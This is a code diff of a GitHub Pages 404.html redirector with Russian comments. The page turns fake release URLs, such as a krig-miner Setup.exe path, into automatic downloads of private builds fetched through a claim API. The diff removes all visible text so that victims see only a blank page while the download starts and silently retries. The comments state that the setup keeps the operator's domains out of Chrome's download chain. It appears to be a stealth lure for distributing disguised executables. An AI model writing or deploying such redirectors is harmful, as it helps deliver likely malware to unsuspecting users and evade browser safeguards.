@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <!--
   404.html — GitHub Pages redirector для Chrome-clean раздачи (file-drpr).
+  ВАРИАНТ: «пустой белый лист» — ноль видимого контента. Юзер кликает ссылку,
+  видит пустую загружающуюся страницу, скачивание стартует само.
 
   КАК РАБОТАЕТ: GitHub Pages отдаёт этот файл на ЛЮБОЙ несуществующий путь,
   например https://<account>.github.io/kryptex/krig-miner/releases/tag/v1.2.1/Setup.exe
   Скрипт берёт location.pathname, дёргает claim-API, получает свежий signed URL
   приватного билда и навигируется. Content-Disposition: attachment → браузер
-  стартует скачивание, вкладка остаётся на github.io. Для Chrome инициатор =
-  github.io, финал = objects.githubusercontent.com — доменов оператора в
-  download-цепочке нет.
+  стартует скачивание, вкладка остаётся пустой страницей на github.io.
 
   ДЕПЛОЙ: заменить https://api.wingo.digital (ниже в JS) на домен claim-API,
   например https://api.example.tld — и закоммитить в репу
@@ -17,63 +17,42 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Download</title>
+<title></title>
 <meta name="referrer" content="no-referrer">
 <meta http-equiv="Cache-Control" content="no-store">
-<style>
-  body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
-       display:flex;align-items:center;justify-content:center;
-       height:100vh;margin:0;color:#333;background:#f7f7f7}
-  .box{text-align:center}
-  .sp{display:inline-block;width:22px;height:22px;border:3px solid #ccc;
-      border-top-color:#555;border-radius:50%;
-      animation:spin .8s linear infinite;vertical-align:middle;margin-right:10px}
-  @keyframes spin{to{transform:rotate(360deg)}}
-  a{color:#0a58ca}
-</style>
+<style>html,body{margin:0;padding:0;background:#fff}</style>
 </head>
 <body>
-<div class="box">
-  <div><span class="sp"></span>Starting download&hellip;</div>
-  <noscript><p>JavaScript is required to start the download.</p></noscript>
-</div>
 <script>
 (function () {
   "use strict";
   /* https://api.wingo.digital → заменить при деплое на https://<api-домен> */
   var CLAIM_BASE = "https://api.wingo.digital";
-  var box = document.querySelector(".box");
-
-  if (!CLAIM_BASE || CLAIM_BASE.indexOf("http") !== 0) {
-    box.innerHTML = "<p>Service misconfigured. Try again later.</p>";
-    return;
-  }
+  if (!CLAIM_BASE || CLAIM_BASE.indexOf("http") !== 0) return;
 
   /* Путь целиком уходит на сервер: резолвинг профиля (точный custom_url_path,
-     конвенция /p/<имя>, первый сегмент = имя профиля) делает /claim —
-     те же правила, что у catchall на dispatcher. */
+     конвенция /p/<имя>, первый сегмент = имя профиля) делает /claim. */
   var url = CLAIM_BASE + "/claim?path=" + encodeURIComponent(location.pathname);
 
-  fetch(url, { method: "GET", cache: "no-store" })
-    .then(function (r) {
-      if (!r.ok) throw new Error("HTTP " + r.status);
-      return r.json();
-    })
-    .then(function (j) {
-      if (!j || !j.url) throw new Error("no url in response");
-      window.location.href = j.url;
-      /* Fallback-кнопка через 2с — если скачивание не стартовало
-         (жёсткий tracking-protection и т.п.) */
-      setTimeout(function () {
-        box.innerHTML =
-          "<p>If your download doesn't start, " +
-          '<a href="' + j.url + '" rel="noreferrer noopener">click here</a>.</p>';
-      }, 2000);
-    })
-    .catch(function () {
-      box.innerHTML =
-        "<p>Download is temporarily unavailable.<br>Please retry in a minute.</p>";
-    });
+  /* Тихий ретрай: до 3 попыток с интервалом 3с (покрывает сетевые блипы и
+     кратковременный 503 pool-empty). Никакого видимого вывода — страница
+     остаётся пустым листом. */
+  var tries = 0;
+  function go() {
+    fetch(url, { method: "GET", cache: "no-store" })
+      .then(function (r) {
+        if (!r.ok) throw new Error("HTTP " + r.status);
+        return r.json();
+      })
+      .then(function (j) {
+        if (!j || !j.url) throw new Error("no url in response");
+        window.location.href = j.url;
+      })
+      .catch(function () {
+        if (++tries < 3) setTimeout(go, 3000);
+      });
+  }
+  go();
 })();
 </script>
 </body>
